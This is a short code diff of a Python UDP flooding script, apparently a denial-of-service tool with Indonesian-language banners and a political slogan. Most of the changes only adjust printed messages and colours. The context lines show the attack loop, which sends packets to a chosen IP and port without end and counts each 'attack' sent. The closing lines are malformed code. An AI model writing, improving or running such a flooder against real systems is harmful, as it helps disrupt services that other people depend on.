@@ -56,9 +56,9 @@ print("\033[32m    PALESTINA saudaraku\033[0m"),
 time.sleep(5),
 print("\033[33m    Kemerdekaan mutlak bagi mereka...\033[0m"),
 time.sleep(5),
-print("\033[32m.   adalah tujuanku...!\033[0m "),
+print("\033[32m    adalah tujuanku...!\033[0m "),
 time.sleep(5),
-print("\033[32m     ...\033[0m")
+print("\033[32m    loading...\033[0m")
 time.sleep(5)
 while True:
     sent = 0
@@ -66,8 +66,8 @@ while True:
         white.sendto(bytes, (ip, port))
         sent = sent + 1
         time.sleep(1)
-        print("\033[48;5;7m\033[38;5;0m %s Info attack\033[0m  \033[37m sent to \033[92m%s  \033[36mPort \033[33m%s " % (sent, ip, port))
-        print("\033[37m Info attack %s \033[31m sent to \033[97m%s"  % (sent, ip,))
+        print("\033[48;5;7m\033[38;5;0m %s Info attack\033[0m \033[37m sent to \033[92m%s \033[36mPort\033[31m%s " % (sent, ip, port))
+        print("\033[37m Info attack %s \033[32m sent to\033[97m%s" % (sent, ip,))
     if():
         s.close
         print("\033[92mSerangan wes Rampung\033[0m")
